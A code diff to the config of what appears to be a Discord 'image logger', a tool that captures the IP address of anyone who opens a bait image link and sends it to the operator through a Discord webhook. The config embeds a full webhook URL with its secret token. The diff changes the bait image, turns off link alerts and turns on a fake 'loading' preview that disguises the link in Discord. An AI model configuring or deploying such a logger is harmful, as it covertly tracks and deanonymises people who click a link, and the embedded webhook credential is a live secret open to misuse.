@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1335633980531150848/y88pQOv_QV5gw_QpZ0yq5ZbVnfMtndqfjL-o4kq5BrcrIU1jGjHjPwd4g8XDdVaNcijI",
-    "image": "https://templates.mediamodifier.com/62c46128f0a2ca1d1a01bef5/clothing-template-pants-and-t-shirt-with-an-alien-for-roblox_thumb.jpg", # You can also have a custom image by using a URL argument
+    "image": "https://kinsta.com/wp-content/uploads/2020/08/tiger-jpg.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
@@ -37,8 +37,8 @@ config = {
                 # 1 = Don't ping when a VPN is suspected
                 # 2 = Don't send an alert when a VPN is suspected
 
-    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
-    "buggedImage": False, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)
+    "linkAlerts": False, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
+    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)
 
     "antiBot": 1, # Prevents bots from triggering the alert
                 # 0 = No Anti-Bot
